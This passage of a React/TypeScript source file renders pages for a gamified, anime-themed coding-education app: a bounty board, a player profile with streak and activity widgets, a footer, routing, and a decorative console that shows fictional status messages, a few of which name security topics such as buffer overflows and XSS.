        {(domain.eps[activeArc] || []).map((ep, idx) => (
          <EpisodeRow key={ep.n} ep={ep} domain={domain} onClick={() => setActiveEpIdx(idx)} />
        ))}
        {(!domain.eps[activeArc] || domain.eps[activeArc].length === 0) && (
          <div className="py-20 text-center border border-dashed border-white/10">
            <p style={{ fontFamily: "'Cinzel', serif", fontSize: '0.5rem', letterSpacing: '0.4em', color: 'rgba(255,255,255,0.15)', textTransform: 'uppercase' }}>
              This arc is still being written.
            </p>
          </div>
        )}
      </div>
    </motion.div>
  );
};

// ─────────────────────────────────────────────
// BOUNTY ROUTE
// ─────────────────────────────────────────────
const BountyRoute = () => (
  <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="p-16 max-w-7xl mx-auto min-h-screen">
    <div className="mb-16">
      <h1 style={{ fontFamily: "'Cinzel', serif", fontSize: 'clamp(3rem,8vw,6rem)', fontWeight: 700, color: '#C8A84B', lineHeight: 0.9, letterSpacing: '0.1em' }}>
        WORLD<br /><span style={{ color: 'white' }}>BOUNTY BOARD</span>
      </h1>
      <p style={{ fontFamily: "'Cormorant Garamond', serif", fontStyle: 'italic', color: 'rgba(200,168,75,0.4)', fontSize: '0.85rem', marginTop: '0.5rem' }}>
        World Government · Cipher Pol · Grand Fleet Intelligence · Updated Every Tide
      </p>
    </div>
    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-10">
      {BOUNTY_BOARD.map(p => (
        <div key={p.r}
          className="border-[10px] p-8 bg-void-dark flex flex-col relative overflow-hidden group transition-all hover:scale-[1.01]"
          style={{ borderColor: (p as any).me ? '#C8A84B' : 'rgba(255,255,255,0.05)' }}>
          <div className="absolute inset-0 opacity-15 group-hover:opacity-30 transition-opacity z-0">
            <img src={p.img} className="w-full h-full object-cover mix-blend-screen"
              onError={e => { (e.target as HTMLImageElement).style.display = 'none'; }} />
            <div className="absolute inset-0 bg-gradient-to-t from-void via-void/80 to-transparent" />
          </div>
          <div className="relative z-10 flex justify-between items-start mb-8">
            <span style={{ fontFamily: "'Cinzel', serif", fontSize: '3rem', fontWeight: 700, color: 'rgba(200,168,75,0.15)', lineHeight: 1 }}>
              {String(p.r).padStart(2,'0')}
            </span>
            <span className="px-2 py-1 border text-xs font-mono" style={{ borderColor: 'rgba(200,168,75,0.2)', color: 'rgba(200,168,75,0.5)', fontSize: '0.38rem', letterSpacing: '0.25em', fontFamily: "'IBM Plex Mono', monospace" }}>
              {p.s}
            </span>
          </div>
          <div className="relative z-10 w-20 h-24 border overflow-hidden mb-8 group-hover:scale-105 transition-all"
            style={{ borderColor: 'rgba(200,168,75,0.2)' }}>
            <img src={p.img} className="w-full h-full object-cover"
              style={{ filter: 'sepia(40%) brightness(60%)' }}
              onError={e => { (e.target as HTMLImageElement).style.display = 'none'; }} />
          </div>
          <h3 style={{ fontFamily: "'Cinzel', serif", fontSize: '0.65rem', letterSpacing: '0.08em', fontWeight: 700, color: 'white', marginBottom: '0.3rem', textTransform: 'uppercase', lineHeight: 1.2 }}>
            {p.n}
          </h3>
          <p style={{ fontFamily: "'Cormorant Garamond', serif", fontSize: '0.65rem', color: 'rgba(255,255,255,0.3)', marginBottom: '0.75rem', fontStyle: 'italic' }}>
            {p.o}
          </p>
          <div className="mt-auto pt-4 border-t" style={{ borderColor: 'rgba(200,168,75,0.12)' }}>
            <p style={{ fontFamily: "'Cinzel', serif", fontSize: '0.35rem', letterSpacing: '0.4em', color: 'rgba(200,168,75,0.4)', textTransform: 'uppercase', marginBottom: '0.25rem' }}>Bounty</p>
            <p style={{ fontFamily: "'Cinzel', serif", fontSize: '1.6rem', fontWeight: 700, color: '#C8A84B', letterSpacing: '0.05em' }}>{p.b}</p>
          </div>
        </div>
      ))}
    </div>
  </motion.div>
);


// ─────────────────────────────────────────────
// PROFILE ROUTE
// ─────────────────────────────────────────────
const ProfileRoute = ({ xp, chosenClass, streak, longestStreak, xpToday }: {
  xp: number;
  chosenClass: CharClass | null;
  streak: number;
  longestStreak: number;
  xpToday: number;
}) => {
  const navigate = useNavigate();
  return (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="p-16 max-w-6xl mx-auto">
      <div className="mb-12">
        <h1 style={{ fontFamily:"'Cinzel',serif", fontSize:'clamp(2.5rem,6vw,4.5rem)', fontWeight:700, color:'#C8A84B', lineHeight:0.9, letterSpacing:'0.1em' }}>
          PIRATE<br /><span style={{ color:'white' }}>LOG</span>
        </h1>
        <p style={{ fontFamily:"'Cormorant Garamond',serif", fontStyle:'italic', color:'rgba(200,168,75,0.35)', fontSize:'0.85rem', marginTop:'0.4rem' }}>
          World Government Wanted Records · Grand Fleet Intelligence Bureau
        </p>
      </div>
      <div className="flex flex-col lg:flex-row gap-14">
        {/* LEFT */}
        <div className="flex-shrink-0 space-y-6" style={{ width:'280px' }}>
          <div className="border-[10px] overflow-hidden" style={{ borderColor:'#C8A84B' }}>
            <div className="text-center py-4 border-b-2" style={{ background:'linear-gradient(90deg,#1a0e00,#0d0800)', borderColor:'#8B6914' }}>
              <h2 style={{ fontFamily:"'Cinzel',serif", fontSize:'2rem', letterSpacing:'0.35em', color:'#C8A84B', fontWeight:700 }}>WANTED</h2>
              <p style={{ fontFamily:"'Cinzel',serif", fontSize:'0.32rem', letterSpacing:'0.4em', color:'rgba(200,168,75,0.4)', textTransform:'uppercase' }}>Dead or Alive</p>
            </div>
            <div className="h-44 overflow-hidden relative border-b border-white/10">
              <img src={chosenClass?.img ?? IMG.actage} className="w-full h-full object-cover"
                style={{ filter:'sepia(50%) brightness(55%)' }}
                onError={(e) => { (e.target as HTMLImageElement).style.display='none'; }} />
              <div className="absolute inset-0" style={{ background:'radial-gradient(ellipse,transparent 30%,rgba(5,4,2,0.7) 100%)' }} />
              {chosenClass && <div className="absolute bottom-3 right-3 text-2xl">{chosenClass.icon}</div>}
            </div>
            <div className="text-center p-5" style={{ background:'#080604' }}>
              <h3 style={{ fontFamily:"'Cinzel',serif", fontSize:'0.9rem', letterSpacing:'0.1em', color:'#e8d5a0', fontWeight:700, textTransform:'uppercase' }}>AKIRA KUROSAWA</h3>
              <p style={{ fontFamily:"'Cormorant Garamond',serif", fontStyle:'italic', color:'rgba(200,168,75,0.4)', fontSize:'0.55rem', marginBottom:'0.6rem' }}>
                {chosenClass ? `"${chosenClass.epithet.slice(0,40)}..."` : '"The Curious Navigator"'}
              </p>
              <p style={{ fontFamily:"'Cinzel',serif", fontSize:'0.3rem', letterSpacing:'0.35em', color:'rgba(200,168,75,0.35)', textTransform:'uppercase', marginBottom:'0.2rem' }}>Bounty</p>
              <p style={{ fontFamily:"'Cinzel',serif", fontSize:'1.6rem', fontWeight:700, color:'#C8A84B' }}>¥{xp.toLocaleString()}</p>
              <p style={{ fontFamily:"'Cormorant Garamond',serif", fontStyle:'italic', fontSize:'0.5rem', color:'rgba(200,168,75,0.28)', marginTop:'0.5rem', lineHeight:1.7 }}>
                Violation: Deploying Transformers<br />Tier Progression: T0 → T1 Active<br />Last Grace: The Abyss
              </p>
            </div>
          </div>
          {chosenClass && (
            <div className="p-5 border" style={{ borderColor:`${chosenClass.col}30`, background:`${chosenClass.col}06` }}>
              <p style={{ fontFamily:"'Cinzel',serif", fontSize:'0.35rem', letterSpacing:'0.5em', color:chosenClass.col, textTransform:'uppercase', marginBottom:'0.4rem' }}>Starting Class</p>
              <h4 style={{ fontFamily:"'Cinzel',serif", fontSize:'0.75rem', fontWeight:700, color:'white', letterSpacing:'0.06em', textTransform:'uppercase', marginBottom:'0.2rem' }}>{chosenClass.name}</h4>
              <p style={{ fontFamily:"'Cormorant Garamond',serif", fontStyle:'italic', color:'rgba(255,255,255,0.35)', fontSize:'0.65rem', lineHeight:1.5, marginBottom:'0.75rem' }}>{chosenClass.manga}</p>
              <div className="space-y-2">
                {chosenClass.stats.map(s => (
                  <div key={s.label} className="flex items-center gap-3">
                    <span style={{ fontFamily:"'IBM Plex Mono',monospace", fontSize:'0.38rem', color:'rgba(200,168,75,0.3)', letterSpacing:'0.15em', textTransform:'uppercase', minWidth:'60px' }}>{s.label}</span>
                    <div className="flex gap-0.5">
                      {Array.from({length:5},(_,i)=>(
                        <div key={i} style={{ width:'14px', height:'6px', background: i < s.val ? chosenClass.col : 'rgba(200,168,75,0.08)' }} />
                      ))}
                    </div>
                  </div>
                ))}
              </div>
              <button onClick={() => navigate('/class')} className="w-full mt-4 py-2 transition-all"
                style={{ background:'transparent', border:`1px solid ${chosenClass.col}30`, color:`${chosenClass.col}60`,
                  fontFamily:"'Cinzel',serif", fontSize:'0.38rem', letterSpacing:'0.25em', textTransform:'uppercase', cursor:'pointer' }}>
                Change Class →
              </button>
            </div>
          )}
          <button onClick={() => navigate('/bounty')} className="w-full py-3 transition-all"
            style={{ background:'rgba(200,168,75,0.08)', border:'1px solid rgba(200,168,75,0.25)', color:'#C8A84B',
              fontFamily:"'Cinzel',serif", fontSize:'0.45rem', letterSpacing:'0.3em', textTransform:'uppercase', cursor:'pointer' }}>
            View Bounty Board →
          </button>
        </div>
        {/* RIGHT */}
        <div className="flex-grow space-y-10">
          <div className="grid grid-cols-2 md:grid-cols-3 gap-5">
            {[
              { l:'Total Bounty', v:`¥${xp.toLocaleString()}`, col:'#C8A84B' },
              { l:'Tiers Entered', v:'2 / 8', col:'white' },
              { l:'World Rank', v:`#${Math.max(1,14-Math.floor(xp/500))}`, col:'#FF4D00' },
              { l:'Battles Cleared', v:'7', col:'#22c55e' },
              { l:'Gauntlets Won', v:'3', col:'#00b4ff' },
              { l:'Avg Score', v:'74%', col:'#8b5cf6' },
            ].map(s => (
              <div key={s.l} className="p-5 border border-white/5 bg-void-dark">
                <p style={{ fontFamily:"'IBM Plex Mono',monospace", fontSize:'0.38rem', color:'rgba(255,255,255,0.25)', letterSpacing:'0.2em', textTransform:'uppercase', marginBottom:'0.3rem' }}>{s.l}</p>
                <p style={{ fontFamily:"'Cinzel',serif", fontSize:'1.8rem', fontWeight:700, color:s.col, lineHeight:1 }}>{s.v}</p>
              </div>
            ))}
          </div>
          <StreakWidget streak={streak} longestStreak={longestStreak} xpToday={xpToday} />
          <div>
            <h3 style={{ fontFamily:"'Cinzel',serif", fontSize:'0.45rem', letterSpacing:'0.45em', color:'rgba(255,255,255,0.18)', textTransform:'uppercase', marginBottom:'0.75rem', paddingBottom:'0.5rem', borderBottom:'1px solid rgba(255,255,255,0.04)' }}>
              Tier Progress
            </h3>
            <div className="space-y-4">
              {Object.values(DOMAINS).map(d => (
                <div key={d.id} className="flex items-center gap-6 cursor-pointer group" onClick={() => navigate(`/series/${d.id}`)}>
                  <div className="w-8 h-8 overflow-hidden flex-shrink-0 border" style={{ borderColor:`${d.col}20` }}>
                    <img src={d.image} className="w-full h-full object-cover group-hover:scale-110 transition-transform"
                      style={{ filter:'brightness(50%) sepia(30%)' }}
                      onError={(e) => { (e.target as HTMLImageElement).style.display='none'; }} />
                  </div>
                  <div className="w-36 flex-shrink-0">
                    <p style={{ fontFamily:"'Cinzel',serif", fontSize:'0.5rem', color:'rgba(255,255,255,0.45)', textTransform:'uppercase', letterSpacing:'0.04em', lineHeight:1.2 }} className="group-hover:text-white transition-colors">{d.name}</p>
                    <p style={{ fontFamily:"'IBM Plex Mono',monospace", fontSize:'0.36rem', color:'rgba(255,255,255,0.18)', letterSpacing:'0.08em' }}>T{d.tier} · {d.manga.split('·')[0].trim()}</p>
                  </div>
                  <div className="flex-grow h-[2px] bg-white/5 relative">
                    <motion.div initial={{ width:0 }} animate={{ width:`${d.prog}%` }} transition={{ duration:1.2, ease:'easeOut', delay:0.1 }} className="absolute top-0 h-full" style={{ background:d.col }} />
                  </div>
                  <span style={{ fontFamily:"'Cinzel',serif", fontSize:'0.65rem', fontWeight:700, color:d.prog>0?d.col:'rgba(255,255,255,0.12)', minWidth:'2.5rem', textAlign:'right' }}>
                    {d.prog>0?`${d.prog}%`:'—'}
                  </span>
                </div>
              ))}
            </div>
          </div>
          <div>
            <h3 style={{ fontFamily:"'Cinzel',serif", fontSize:'0.45rem', letterSpacing:'0.45em', color:'rgba(255,255,255,0.18)', textTransform:'uppercase', marginBottom:'0.75rem', paddingBottom:'0.5rem', borderBottom:'1px solid rgba(255,255,255,0.04)' }}>
              Recent Activity
            </h3>
            <ActivityFeed />
          </div>
          <div className="flex gap-4 pt-4">
            <button onClick={() => navigate('/registry')} className="px-12 py-4 transition-all hover:scale-105"
              style={{ background:'#C8A84B', color:'#050402', fontFamily:"'Cinzel',serif", fontSize:'0.55rem', fontWeight:700, letterSpacing:'0.25em', textTransform:'uppercase', border:'none', cursor:'pointer', boxShadow:'0 8px 30px rgba(200,168,75,0.25)' }}>
              Browse All Tiers →
            </button>
            <button onClick={() => navigate('/class')} className="px-8 py-4 transition-all hover:scale-105"
              style={{ background:'transparent', color:'rgba(200,168,75,0.5)', border:'1px solid rgba(200,168,75,0.2)', fontFamily:"'Cinzel',serif", fontSize:'0.5rem', letterSpacing:'0.2em', textTransform:'uppercase', cursor:'pointer' }}>
              Change Class
            </button>
          </div>
        </div>
      </div>
    </motion.div>
  );
};

// ─────────────────────────────────────────────
// FOOTER
// ─────────────────────────────────────────────
const Footer = () => {
  const navigate = useNavigate();
  return (
    <footer className="border-t border-white/5 px-16 py-16" style={{ background: '#050402' }}>
      <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between gap-12">
        <div>
          <h2 style={{ fontFamily: "'Cinzel', serif", fontSize: '1.5rem', fontWeight: 700, color: '#C8A84B', letterSpacing: '0.2em' }}>Ω EPHEMERAL</h2>
          <p style={{ fontFamily: "'Cormorant Garamond', serif", fontStyle: 'italic', color: 'rgba(200,168,75,0.3)', fontSize: '0.8rem', maxWidth: '360px', lineHeight: 1.7, marginTop: '0.75rem' }}>
            A hero's journey through code. Eight tiers. Twenty series. One path from Training Village to Absolute Ruleset. Begin Tarnished.
          </p>
        </div>
        <div className="flex gap-16">
          {[
            { title: 'Arcs', items: [['HOME', '/'], ['Grand Line', '/registry'], ['Bounty Board', '/bounty']] },
            { title: 'Records', items: [['Pirate Log', '/profile'], ['Tier 0', '/series/t0_village'], ['Tier 4 Oracle', '/series/t4_oracle']] },
          ].map(col => (
            <div key={col.title} className="flex flex-col gap-4">
              <p style={{ fontFamily: "'Cinzel', serif", fontSize: '0.4rem', letterSpacing: '0.5em', color: '#C8A84B', textTransform: 'uppercase' }}>{col.title}</p>
              {col.items.map(([label, path]) => (
                <button key={label} onClick={() => navigate(path)}
                  style={{ fontFamily: "'Cinzel', serif", fontSize: '0.5rem', letterSpacing: '0.2em', color: 'rgba(200,168,75,0.4)', textTransform: 'uppercase', background: 'none', border: 'none', cursor: 'pointer', textAlign: 'left' }}
                  className="hover:text-white transition-colors">
                  {label}
                </button>
              ))}
            </div>
          ))}
        </div>
      </div>
      <div className="mt-12 border-t border-white/5 pt-6 max-w-7xl mx-auto flex justify-between">
        <p style={{ fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.38rem', color: 'rgba(200,168,75,0.2)', letterSpacing: '0.2em', textTransform: 'uppercase' }}>
          EPHEMERAL STUDIO · {new Date().getFullYear()} · ALL TIERS UNLOCKED
        </p>
        <div className="flex gap-2">
          {Object.values(DOMAINS).map(d => (
            <div key={d.id} className="w-1.5 h-1.5 rounded-full" style={{ background: d.prog > 0 ? d.col : 'rgba(255,255,255,0.1)' }} title={d.name} />
          ))}
        </div>
      </div>
    </footer>
  );
};

// ─────────────────────────────────────────────
// TERMINAL CONSOLE
// ─────────────────────────────────────────────
const TerminalConsole = () => {
  const [logs, setLogs] = useState<{ id: number; text: string; type: 'info' | 'crit' }[]>([]);
  const [open, setOpen] = useState(false);

  const MSGS = [
    "CRIT: Eclipse kernel panic — Brand of Sacrifice fires at sunset, interrupt 0x0D unhandled",
    "T3: Nami's Log Pose locked — DNS resolving next island: 42ms TTL",
    "T1: Buffer overflow detected — EIP overwritten at 0x41414141",
    "T2: Jonas enters the passage — PID namespace created, new world PID=1",
    "T4: LLM training epoch 1/10 — loss=2.456, perplexity=11.67",
    "T6: Raft leader elected — node_3 wins with 4/6 votes",
    "T3: XSS payload executed — admin cookie harvested by Kagurabachi strike",
    "ALERT: Adversarial pixel attack detected — classifier sees 'bouquet' in place of weapon",
    "T5: Dijkstra converged — optimal route found in 23ms (4,812 nodes scanned)",
    "T7: WASM compiled — pixel shader runs at 128fps (was 8fps on main thread)",
  ];

  useEffect(() => {
    const iv = setInterval(() => {
      if (Math.random() > 0.65)
        setLogs(l => [{ id: Date.now(), text: MSGS[Math.floor(Math.random() * MSGS.length)], type: Math.random() > 0.85 ? 'crit' : 'info' }, ...l].slice(0, 40));
    }, 4000);
    return () => clearInterval(iv);
  }, []);

  return (
    <div className={`fixed bottom-0 right-6 z-[100] w-96 transition-all duration-400 overflow-hidden`} style={{ height: open ? '220px' : '36px' }}>
      <div onClick={() => setOpen(!open)} className="h-9 flex items-center justify-between px-5 cursor-pointer"
        style={{ background: '#C8A84B', fontFamily: "'Cinzel', serif", fontSize: '0.38rem', letterSpacing: '0.4em', color: '#050402', textTransform: 'uppercase' }}>
        <div className="flex items-center gap-2"><Terminal className="w-3 h-3" /><span>Grand Fleet Console</span></div>
        <span>{open ? '— Minimize' : '+ Expand'}</span>
      </div>
      <div className="h-full bg-black/98 border-x border-white/5 p-4 overflow-y-auto flex flex-col-reverse gap-2">
        {logs.map(l => (
          <div key={l.id} className="flex gap-3" style={{ fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.5rem' }}>
            <span style={{ color: l.type === 'crit' ? '#FF4D00' : 'rgba(200,168,75,0.3)', flexShrink: 0 }}>
              [{new Date(l.id).toLocaleTimeString([], { hour12: false })}]
            </span>
            <span style={{ color: l.type === 'crit' ? '#FF4D00' : 'rgba(200,168,75,0.6)' }}>{l.text}</span>
          </div>
        ))}
        <div style={{ fontFamily: "'IBM Plex Mono', monospace", fontSize: '0.5rem', color: 'rgba(200,168,75,0.2)' }}>
          --- EPHEMERAL CONSOLE v3.0 · GRACE LINKED ---
        </div>
      </div>
    </div>
  );
};

// ─────────────────────────────────────────────
// STREAK TRACKER WIDGET
// ─────────────────────────────────────────────
const StreakWidget = ({ streak, longestStreak, xpToday }: {
  streak: number; longestStreak: number; xpToday: number;
}) => {
  const days = ['M','T','W','T','F','S','S'];
  const daysFired = Math.min(streak, 7);
  return (
    <div className="p-6 border" style={{ borderColor:'rgba(200,168,75,0.12)', background:'rgba(200,168,75,0.03)' }}>
      <div className="flex items-center justify-between mb-5">
        <p style={{ fontFamily:"'Cinzel',serif", fontSize:'0.4rem', letterSpacing:'0.5em', color:'rgba(200,168,75,0.4)', textTransform:'uppercase' }}>
          ✦ Grace Streak
        </p>
        <p style={{ fontFamily:"'Cinzel',serif", fontSize:'0.4rem', letterSpacing:'0.3em', color:'rgba(200,168,75,0.25)', textTransform:'uppercase' }}>
          BEST: {longestStreak}d
        </p>
      </div>
      <div className="flex items-end gap-3 mb-4">
        <span style={{ fontFamily:"'Cinzel',serif", fontSize:'2.8rem', fontWeight:700, color:'#C8A84B', lineHeight:1 }}>{streak}</span>
        <div className="pb-1">
          <span style={{ fontFamily:"'IBM Plex Mono',monospace", fontSize:'0.45rem', color:'rgba(200,168,75,0.45)', letterSpacing:'0.15em' }}>DAYS</span>
          <div style={{ fontFamily:"'Cormorant Garamond',serif", fontStyle:'italic', fontSize:'0.6rem', color:'rgba(200,168,75,0.3)' }}>
            {streak >= 7 ? '🔥 On fire' : streak >= 3 ? '⚡ Building momentum' : 'Keep going'}
          </div>
        </div>
      </div>
      {/* Day dots */}
      <div className="flex gap-2 mb-4">
        {days.map((d, i) => (
          <div key={i} className="flex flex-col items-center gap-1">
            <div className="w-7 h-7 flex items-center justify-center"
              style={{
                background: i < daysFired ? 'rgba(200,168,75,0.2)' : 'rgba(255,255,255,0.04)',
                border: `1px solid ${i < daysFired ? '#C8A84B' : 'rgba(255,255,255,0.06)'}`,
              }}>
              {i < daysFired && <span style={{ color:'#C8A84B', fontSize:'0.5rem' }}>✦</span>}
            </div>
            <span style={{ fontFamily:"'IBM Plex Mono',monospace", fontSize:'0.35rem', color: i < daysFired ? 'rgba(200,168,75,0.5)' : 'rgba(255,255,255,0.1)', letterSpacing:'0.1em' }}>{d}</span>
          </div>
        ))}
      </div>
      {/* XP today */}
      <div className="flex justify-between items-center pt-4 border-t" style={{ borderColor:'rgba(200,168,75,0.08)' }}>
        <span style={{ fontFamily:"'IBM Plex Mono',monospace", fontSize:'0.4rem', color:'rgba(200,168,75,0.3)', letterSpacing:'0.15em', textTransform:'uppercase' }}>Today's Haul</span>
        <span style={{ fontFamily:"'Cinzel',serif", fontSize:'0.85rem', fontWeight:700, color:'#C8A84B' }}>+¥{xpToday.toLocaleString()}</span>
      </div>
    </div>
  );
};

// ─────────────────────────────────────────────
// RECENT ACTIVITY FEED
// ─────────────────────────────────────────────
const ACTIVITY_FEED = [
  { time:'2h ago',  icon:'⚔️', col:'#c41230', text:'Cleared Gauntlet — Eclipse Protocol T1·E1', xp:'+¥240' },
  { time:'1d ago',  icon:'📖', col:'#7c3aed', text:'Scroll studied — Smashing the Stack (Phrack 49)', xp:'+¥40' },
  { time:'1d ago',  icon:'🏆', col:'#f5c518', text:'Arc Cleared — East Blue Saga (100%)', xp:'+¥500 BONUS' },
  { time:'2d ago',  icon:'👊', col:'#22c55e', text:'Quiz passed — Saitama\'s O(1) Training', xp:'+¥80' },
  { time:'3d ago',  icon:'🔗', col:'#C8A84B', text:'Gauntlet — Winden Temporal Chains (Backprop)', xp:'+¥180' },
  { time:'4d ago',  icon:'🧠', col:'#00b4ff', text:'Research — Attention Is All You Need (Vaswani)', xp:'+¥60' },
];

const ActivityFeed = () => (
  <div className="space-y-3">
    {ACTIVITY_FEED.map((a, i) => (
      <motion.div key={i}
        initial={{ opacity:0, x:-10 }} animate={{ opacity:1, x:0 }}
        transition={{ delay: i * 0.05 }}
        className="flex items-start gap-4 p-4 border border-white/5 bg-void-dark"
      >
        <div className="w-8 h-8 flex items-center justify-center flex-shrink-0 text-base"
          style={{ background:`${a.col}18`, border:`1px solid ${a.col}30` }}>
          {a.icon}
        </div>
        <div className="flex-grow min-w-0">
          <p style={{ fontFamily:"'Cinzel',serif", fontSize:'0.6rem', color:'rgba(255,255,255,0.65)', letterSpacing:'0.04em', lineHeight:1.4 }}>{a.text}</p>
          <p style={{ fontFamily:"'IBM Plex Mono',monospace", fontSize:'0.38rem', color:'rgba(255,255,255,0.2)', letterSpacing:'0.1em', marginTop:'0.2rem' }}>{a.time}</p>
        </div>
        <span style={{ fontFamily:"'Cinzel',serif", fontSize:'0.55rem', fontWeight:700, color:a.col, flexShrink:0 }}>{a.xp}</span>
      </motion.div>
    ))}
  </div>
);

// ─────────────────────────────────────────────
// ROOT APP
// ─────────────────────────────────────────────
export default function App() {
  const [xp, setXp] = useState(430);
  const [hasChosen, setHasChosen] = useState(false);
  const [chosenClass, setChosenClass] = useState<CharClass | null>(null);
  const [streak] = useState(5);
  const [longestStreak] = useState(12);
  const [xpToday] = useState(320);

  // Show character selection on first visit
  if (!hasChosen) {
    return (
      <CharacterClassRoute onSelect={(cls) => {
        setChosenClass(cls);
        setHasChosen(true);
      }} />
    );
  }

  return (
    <div className="flex flex-col min-h-screen" style={{ background: '#0A0A0A', color: 'white' }}>
      <Navigation xp={xp} />
      <TerminalConsole />
      <main className="flex-grow pt-20">
        <AnimatePresence mode="wait">
          <Routes>
            <Route path="/" element={<HomeRoute />} />
            <Route path="/registry" element={<RegistryView />} />
            <Route path="/class" element={
              <CharacterClassRoute onSelect={(cls) => { setChosenClass(cls); }} />
            } />
            <Route path="/series/:id" element={<SeriesRoute xp={xp} setXp={setXp} />} />
            <Route path="/bounty" element={<BountyRoute />} />
            <Route path="/profile" element={
              <ProfileRoute
                xp={xp}
                chosenClass={chosenClass}
                streak={streak}
                longestStreak={longestStreak}
                xpToday={xpToday}
              />
            } />
            <Route path="*" element={<Navigate to="/" />} />
          </Routes>
        </AnimatePresence>
      </main>
      <Footer />
    </div>
  );
}
